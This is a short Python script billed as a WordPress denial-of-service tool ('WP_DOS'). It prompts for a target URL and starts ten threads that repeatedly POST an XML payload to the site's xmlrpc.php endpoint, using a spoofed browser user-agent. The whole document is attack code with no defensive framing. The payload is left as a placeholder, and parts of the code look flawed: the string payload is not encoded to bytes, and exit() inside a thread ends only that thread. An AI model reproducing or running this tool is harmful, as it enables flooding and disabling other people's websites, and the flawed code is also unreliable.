import urllib.request
import threading
import time
from pyfiglet import Figlet
import random


fonts = Figlet().getFonts()
font = random.choice(fonts)

f = Figlet(font=font)
print(f.renderText('WP_DOS'))
print("\033[1;31;40m Created by Mohamed Thoufeeq")

site = input("Enter the URL: ")
url = site + "/xmlrpc.php"
payload = "PUT_YOUR_PAYLOAD_HERE"
headers = {'Content-type': 'text/xml', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'}

class RequestThread(threading.Thread):
    def run(self):
        while True:
            try:
                request = urllib.request.Request(url, data=payload, headers=headers)
                response = urllib.request.urlopen(request)
                print("\033[1;32;40m Response received: ", response.read())
                if response.getcode() == 403:
                    print("\033[1;31;40m The server returned a 403 status code, the website is not vulnerable.")
                    exit()
            except urllib.error.URLError:
                pass
            time.sleep(1)

if __name__ == "__main__":
    print("\033[1;35;40m Sending requests...")
    for i in range(10):
        t = RequestThread()
        t.start()

